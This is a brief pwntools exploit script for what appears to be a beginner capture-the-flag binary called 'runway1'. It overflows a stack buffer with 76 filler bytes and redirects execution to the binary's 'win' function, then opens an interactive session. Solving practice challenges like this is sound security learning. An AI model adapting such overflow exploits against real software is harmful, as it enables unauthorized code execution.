#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("runway1")

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote("address", 12345)
    else:
        return process(elf.path)

# Plan:

# Addresses

# Functions

io = start()

offset = 76

payload = b"A"*offset
payload += p32(elf.sym['win'])
io.sendlineafter(b"What is your favorite food?", payload)


io.interactive()
